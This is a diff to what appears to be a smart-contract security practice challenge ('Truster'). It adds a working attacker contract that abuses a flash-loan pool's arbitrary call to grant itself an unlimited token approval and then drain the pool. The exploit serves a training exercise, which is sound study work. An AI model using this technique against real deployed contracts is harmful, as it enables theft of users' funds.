@@ -51,7 +51,9 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Deploying the attacker is the player's single transaction;
+        // the constructor does the approve + transferFrom inside it.
+        new TrusterAttacker(pool, token, recovery);
     }
 
     /**
@@ -64,5 +66,16 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract TrusterAttacker {
+    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
+        // 1. Zero-amount loan: the pool itself calls token.approve(attacker, max)
+        bytes memory data = abi.encodeCall(token.approve, (address(this), type(uint256).max));
+        pool.flashLoan(0, address(this), address(token), data);
+
+        // 2. Spend the allowance the pool just granted us
+        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
     }
 }
